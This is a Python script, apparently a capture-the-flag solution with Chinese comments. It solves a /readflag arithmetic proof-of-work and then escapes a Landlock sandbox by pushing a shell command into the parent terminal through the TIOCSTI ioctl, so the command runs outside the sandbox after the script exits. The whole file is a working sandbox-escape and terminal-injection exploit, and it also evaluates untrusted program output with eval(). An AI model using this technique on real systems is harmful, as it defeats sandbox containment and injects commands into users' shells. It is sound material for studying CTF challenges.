import re
import subprocess
import fcntl
import termios
import os
import sys
import time

def solve_challenge():
    """执行 readflag 并完成计算任务"""
    # 启动子进程
    p = subprocess.Popen(
        ["/readflag"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True,
        bufsize=1
    )

    expr = None
    # 逐行读取直到找到表达式
    while True:
        line = p.stdout.readline()
        if not line:
            break
        print(f"[*] 题目行: {line.strip()}")
        
        # 匹配算术表达式
        m = re.search(r'([-+()0-9]+)', line)
        if m and any(c.isdigit() for c in m.group()):
            expr = m.group()
            break

    if not expr:
        return None

    # 计算 POW 结果
    result = eval(expr)
    print(f"[*] 计算答案: {result}")
    
    # 发送答案
    p.stdin.write(str(result) + "\n")
    p.stdin.flush()
    
    # 获取输出
    output = p.stdout.read()
    p.wait()
    return result, output

def escape_via_tiocsti(payload_cmd):
    """
    1day 逃逸核心：利用 TIOCSTI 漏洞将命令注入父 Shell。
    原理：Landlock 限制了当前进程的文件操作，但如果没禁用 ioctl(TIOCSTI)，
    我们可以把命令写进终端缓冲区，Python 退出后，沙箱外的 Shell 会执行它。
    """
    print("\n[!] Attempting TIOCSTI injection escape...")
    try:
        # 确保我们要注入到标准输入终端
        target_tty = sys.stdin.fileno()
        
        # 构造注入命令：在 Python 退出后自动运行不受限的 /readflag 并自动输入结果
        # 注意：末尾的 \n 触发执行
        full_payload = f"{payload_cmd}\n"
        
        for char in full_payload:
            # TIOCSTI = 0x5412 (Linux)
            fcntl.ioctl(target_tty, termios.TIOCSTI, char)
            
        print("[+] Injection buffer loaded. Flag will appear after script exits.")
    except Exception as e:
        print(f"[-] TIOCSTI escape failed: {e}")

if __name__ == "__main__":
    # 1. 首先在沙箱内尝试运行，获取 POW 答案
    # 因为沙箱内 readflag 虽然读不到 flag，但通常能给出算术题
    print("--- Phase 1: Obtaining POW Answer ---")
    res = solve_challenge()
    
    if res:
        answer, output = res
        print(f"[*] Subprocess Inside Sandbox: {output.strip()}")
        
        # 2. 如果内部读取为空，触发外部注入逃逸
        # 构造一个能在外部 Shell 自动完成 POW 的命令
        # 这里的命令：运行 /readflag，通过 echo 把答案传进去
        payload = f"echo {answer} | /readflag"
        
        print("--- Phase 2: Triggering 1day Escape ---")
        escape_via_tiocsti(payload)
    else:
        print("[-] Could not find the challenge expression.")

    # 脚本结束，触发缓冲区执行
    sys.exit(0)
